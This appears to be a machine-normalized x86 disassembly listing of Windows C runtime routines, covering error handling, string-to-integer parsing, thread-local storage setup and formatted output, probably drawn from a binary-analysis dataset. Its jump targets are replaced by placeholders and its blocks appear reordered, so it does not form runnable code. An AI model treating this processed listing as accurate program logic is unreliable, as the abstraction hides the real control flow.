jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_10010d42
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x248 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
xor esi esi
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + sub_1000b602 ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x274 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x274 ]
mov edi [ ebp - 0x21c ]
mov dl al
jmp r-xdata
sub_1000b631
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_1000ffa0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1001108f
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_1001108f
pop ecx
sub_1000b75a
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_1000b631
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_1000b77f
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000b75a
int3
pop ebp
jmp eax
sub_1000b7bc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_1000b824
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1000b811
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_1000b7bc
pop ecx
mov esi eax
call sub_1000b7fe
mov [ eax ] esi
pop esi
pop ebp
retn
sub_1000b847
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_10009611
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_1000ea36
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_1000b7fe
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_1000ba72
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_1000b847
add esp 0x14
pop ebp
retn
sub_1000baaf
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_1000bae3
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_10011d0f
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_1000bb20
push 0x8
push r--data
call sub_1000f940
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_10011e3f
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000bbc2
push 0xc
call sub_10011e3f
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_1000e6fd
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000bbcb
call sub_1000f985
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_1000bbd4
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_1000baaf
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_1000f19d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_10009957
pop ecx
xor esi esi
push 0x0
push esi
call sub_1000bb20
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_1000bc67
push 0x8
push r--data
call sub_1000f940
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1000f985
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_10009957
pop ecx
push 0xd
call sub_10011e3f
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_10009957
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000bd81
push 0xc
call sub_10011e3f
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000bd8d
push esi
call sub_10009957
pop ecx
push edi
call sub_1000e78c
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_10009957
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_1000e825
pop ecx
sub_1000bd96
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_1000bc67
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_1000be04
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_1000bae3
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_1000baa6
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_1000ebd4
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_10011cc5
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_1000bae3
mov edi [ DecodePointer@IAT ]
push sub_1000bc67
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_1000f19d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_1000bb20
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_1000bf7f
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_10011e72
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_1000bfae
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
dec [ ebp + 0xc ]
push eax
mov eax ebx
call sub_1000bf7f
add [ ebp + 0x8 ] 0x2
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x3f
mov eax ebx
call sub_1000bf7f
pop ecx
sub_1000c015
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x458 ]
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x408 ] ebx
mov [ ebp - 0x430 ] ebx
mov [ ebp - 0x40c ] ebx
mov [ ebp - 0x428 ] ebx
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x42c ] ebx
call sub_10009611
call sub_1000b7fe
mov [ ebp - 0x464 ] eax
cmp [ ebp - 0x424 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
cmp [ ebp - 0x44c ] bl
movzx ecx [ esi ]
xor edx edx
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x43c ] ebx
mov [ ebp - 0x41c ] ecx
cmp cx bx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x44c ] 0x0
je r-xdata
push 0x2
pop ebx
add esi ebx
cmp [ ebp - 0x418 ] 0x0
mov [ ebp - 0x440 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
mov eax [ ebp - 0x418 ]
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ecx - 0x20 ]
cmp ax 0x58
ja r-xdata
xor eax eax
movzx eax cx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov esi [ ebp - 0x440 ]
movzx eax [ esi ]
mov [ ebp - 0x41c ] eax
test ax ax
je r-xdata
jmp [ eax * 4 + jump_table_1000cbbd ]
movsx eax [ edx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop edx
mov [ ebp - 0x460 ] eax
cmp eax edx
ja r-xdata
mov edx [ ebp - 0x460 ]
mov edi [ ebp - 0x420 ]
mov ecx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x468 ] eax
mov [ ebp - 0x448 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x428 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x42c ] eax
jmp r-xdata
movzx eax cx
sub eax 0x20
je r-xdata
cmp cx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp cx 0x2a
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x424 ]
push ecx
lea esi [ ebp - 0x418 ]
mov [ ebp - 0x42c ] 0x1
call sub_1000bf7f
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or [ ebp - 0x408 ] ebx
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x430 ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x430 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x430 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x40c ] edi
test edi edi
jns r-xdata
movzx eax [ esi ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
pop ecx
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x430 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax ebx
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0x408 ] 0x8000
mov [ ebp - 0x440 ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov ebx [ ebp - 0x40c ]
cmp ebx 0xffffffff
jne r-xdata
sub eax ebx
je r-xdata
mov [ ebp - 0x40c ] 0x8
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
mov eax [ edi ]
mov edx [ edi + 0x4 ]
add edi 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0x408 ] 0xffff7fff
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add esi ebx
or [ ebp - 0x408 ] 0x1000
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x410 ] edi
je r-xdata
mov ebx 0x7fffffff
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x10
je r-xdata
cmp [ ebp - 0x448 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x444 ] edx
jmp r-xdata
sub eax ebx
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] 0x8
jmp r-xdata
cmp eax 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x444 ] 0x27
mov ecx [ ebp - 0x408 ]
test ecx 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x434 ] ax
mov eax [ ebp - 0x444 ]
add eax 0x51
mov [ ebp - 0x432 ] ax
mov [ ebp - 0x428 ] ebx
jmp r-xdata
cmp [ ebp - 0x43c ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea ebx [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x420 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x420 ] edi
test eax eax
je r-xdata
sub eax edx
je r-xdata
or [ ebp - 0x408 ] 0x20
add ecx 0x20
mov [ ebp - 0x468 ] 0x1
mov [ ebp - 0x41c ] ecx
sub eax ebx
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x43c ]
call sub_10009957
and [ ebp - 0x43c ] 0x0
mov edi [ ebp - 0x430 ]
sub edi [ ebp - 0x414 ]
sub edi [ ebp - 0x428 ]
mov [ ebp - 0x41c ] edi
test al 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax ebx
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax ebx
je r-xdata
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
push [ ebp - 0x428 ]
mov edi [ ebp - 0x464 ]
mov ebx [ ebp - 0x424 ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x418 ]
call sub_1000bfae
test [ ebp - 0x408 ] 0x8
pop ecx
pop ecx
je r-xdata
jmp r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x470 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x458 ]
push eax
push [ ebp - 0x468 ]
movsx eax [ ebp - 0x41c ]
push [ ebp - 0x40c ]
mov [ ebp - 0x420 ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x470 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x408 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x420 ] edi
call sub_10011a99
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ edi ]
add edi 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x45c ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax ebx
jne r-xdata
cmp eax 0x58
je r-xdata
dec ebx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x458 ]
movzx eax al
push ecx
push eax
call sub_1001010a
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x42c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop ecx
mov [ ebp - 0x434 ] cx
mov [ ebp - 0x428 ] 0x1
